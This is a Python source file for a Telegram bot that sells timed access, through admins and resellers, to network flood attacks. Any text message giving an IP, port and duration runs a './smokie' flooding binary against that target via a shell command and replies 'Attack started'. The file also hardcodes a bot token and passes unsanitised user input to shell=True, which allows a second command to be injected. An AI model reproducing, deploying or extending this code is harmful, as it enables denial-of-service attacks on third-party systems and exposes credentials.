import json
import logging
import time
import subprocess
from datetime import datetime
from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext

# ✅ Configuration
TOKEN = "7831102909:AAG3y0-k3qzoIX4SJCGtbHkDiDNJXuT3zdk"
ADMIN_ID = 6135948216  # Change this to your Telegram ID
DATA_FILE = "users.json"

# ✅ Setup Logging
logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)

# ✅ Load user data
def load_data():
    try:
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {"user_access": {}, "resellers": [], "reseller_users": {}}

# ✅ Save user data
def save_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=4)

# ✅ Initialize user data
data = load_data()
user_access = data["user_access"]
resellers = set(data["resellers"])
reseller_users = data["reseller_users"]

# ✅ Help Command
def help_command(update: Update, context: CallbackContext) -> None:
    help_text = """
🔹 **Available Commands:**
/listusers - Show all active users (Admin only)
/listresellers - Show all resellers (Admin only)
/listresellerusers <reseller_id> - Show users added by a reseller (Admin only)
/myusers - Show your added users (Reseller only)
/addreseller <user_id> - Add a reseller (Admin only)
/add <user_id> <days> - Add user access (Admin & Reseller)
/remove <user_id> - Remove user access (Admin only)

📌 **Attack Command Format:**  
<IP> <PORT> <DURATION>  
Example: `192.168.1.1 8080 60`
"""
    update.message.reply_text(help_text, parse_mode="Markdown")

# ✅ Check Admin Access
def is_admin(user_id):
    return user_id == ADMIN_ID

# ✅ Check Reseller Access
def is_reseller(user_id):
    return str(user_id) in reseller_users

# ✅ List Active Users (Admin Only)
def list_users(update: Update, context: CallbackContext) -> None:
    if not is_admin(update.message.from_user.id):
        return update.message.reply_text("🚫 Unauthorized access.")

    message = "**🔹 Active Users:**\n"
    for user_id, expiry in user_access.items():
        expiry_date = datetime.utcfromtimestamp(expiry).strftime('%Y-%m-%d %H:%M:%S')
        message += f"👤 **User ID:** `{user_id}` - Expiry: `{expiry_date} UTC`\n"

    update.message.reply_text(message or "No active users.", parse_mode="Markdown")

# ✅ List Resellers (Admin Only)
def list_resellers(update: Update, context: CallbackContext) -> None:
    if not is_admin(update.message.from_user.id):
        return update.message.reply_text("🚫 Unauthorized access.")

    message = "**🔹 Active Resellers:**\n" + "\n".join(f"👤 `{reseller_id}`" for reseller_id in resellers)
    update.message.reply_text(message or "No active resellers.", parse_mode="Markdown")

# ✅ List Users of a Reseller (Admin Only)
def list_reseller_users(update: Update, context: CallbackContext) -> None:
    if not is_admin(update.message.from_user.id):
        return update.message.reply_text("🚫 Unauthorized access.")

    args = context.args
    if not args:
        return update.message.reply_text("Usage: /listresellerusers <reseller_id>")

    reseller_id = args[0]
    users = reseller_users.get(reseller_id, [])
    message = f"🔹 **Users added by Reseller {reseller_id}:**\n" + "\n".join(f"👤 `{user_id}`" for user_id in users)
    update.message.reply_text(message or "No users found.", parse_mode="Markdown")

# ✅ List Users Added by the Reseller
def my_users(update: Update, context: CallbackContext) -> None:
    reseller_id = str(update.message.from_user.id)
    if reseller_id not in reseller_users:
        return update.message.reply_text("🚫 You are not a reseller.")

    users = reseller_users[reseller_id]
    message = "**🔹 Your Active Users:**\n" + "\n".join(f"👤 `{user_id}`" for user_id in users)
    update.message.reply_text(message or "No users found.", parse_mode="Markdown")

# ✅ Add Reseller (Admin Only)
def add_reseller(update: Update, context: CallbackContext) -> None:
    if not is_admin(update.message.from_user.id):
        return update.message.reply_text("🚫 Unauthorized access.")

    args = context.args
    if not args:
        return update.message.reply_text("Usage: /addreseller <user_id>")

    reseller_id = args[0]
    resellers.add(reseller_id)
    reseller_users[reseller_id] = []
    save_data({"user_access": user_access, "resellers": list(resellers), "reseller_users": reseller_users})
    update.message.reply_text(f"✅ User {reseller_id} is now a reseller.")

# ✅ Add User (Admin & Resellers)
def add_user(update: Update, context: CallbackContext) -> None:
    sender_id = update.message.from_user.id
    if not is_admin(sender_id) and not is_reseller(sender_id):
        return update.message.reply_text("🚫 Unauthorized access.")

    args = context.args
    if len(args) != 2:
        return update.message.reply_text("Usage: /add <user_id> <days>")

    user_id, days = args[0], int(args[1])
    user_access[user_id] = time.time() + (days * 86400)
    if is_reseller(sender_id):
        reseller_users[str(sender_id)].append(user_id)
    save_data({"user_access": user_access, "resellers": list(resellers), "reseller_users": reseller_users})
    update.message.reply_text(f"✅ User {user_id} granted access for {days} days.")

# ✅ Remove User (Admin Only)
def remove_user(update: Update, context: CallbackContext) -> None:
    if not is_admin(update.message.from_user.id):
        return update.message.reply_text("🚫 Unauthorized access.")

    args = context.args
    if not args:
        return update.message.reply_text("Usage: /remove <user_id>")

    user_id = args[0]
    user_access.pop(user_id, None)
    save_data({"user_access": user_access, "resellers": list(resellers), "reseller_users": reseller_users})
    update.message.reply_text(f"✅ User {user_id} removed.")

# ✅ Handle Attack Command
def handle_attack(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    if user_id not in user_access or time.time() > user_access[user_id]:
        return update.message.reply_text("🚫 Access denied or expired.")

    args = update.message.text.split()
    if len(args) != 3:
        return update.message.reply_text("Usage: <IP> <PORT> <DURATION>")

    ip, port, duration = args
    command = f"./smokie {ip} {port} {duration} 50 50"
    subprocess.Popen(command, shell=True)
    update.message.reply_text(f"🚀 Attack started on {ip}:{port} for {duration} seconds!")

# ✅ Start Bot
def main():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("help", help_command))
    dp.add_handler(CommandHandler("listusers", list_users))
    dp.add_handler(CommandHandler("listresellers", list_resellers))
    dp.add_handler(CommandHandler("listresellerusers", list_reseller_users))
    dp.add_handler(CommandHandler("myusers", my_users))
    dp.add_handler(CommandHandler("addreseller", add_reseller))
    dp.add_handler(CommandHandler("add", add_user))
    dp.add_handler(CommandHandler("remove", remove_user))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_attack))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
